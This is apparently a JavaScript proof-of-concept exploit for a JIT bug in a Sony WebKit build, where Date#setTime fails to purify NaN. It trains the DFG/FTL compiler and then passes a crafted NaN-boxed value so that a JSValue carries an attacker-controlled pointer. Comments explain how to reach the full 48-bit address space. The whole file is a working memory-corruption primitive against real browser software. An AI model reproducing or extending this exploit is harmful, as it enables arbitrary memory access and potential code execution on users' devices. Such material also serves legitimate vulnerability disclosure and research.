// Bug 5 - Date#setTime does not purify NaN (DFG/FTL). Sony WebKit-1400.
// The payload becomes a JSValue whose cell pointer is attacker-controlled.
// Change 0xfffe000041414141 to 0xfffe7f0000414141 to reach the full 48-bit space.
function opt(date, f) { date.setTime(f[0]); }
const u = new BigUint64Array(1), f = new Float64Array(u.buffer);
const d = new Date();
for (let i = 0; i < 2000000; i++) opt(d, f);      // train JIT as double
u[0] = 0xfffe000041414141n;
opt(d, f);
const t = d.getTime();                             // tainted JSValue
t.foo = 1;                                         // READ at 0x41414141 (+5)
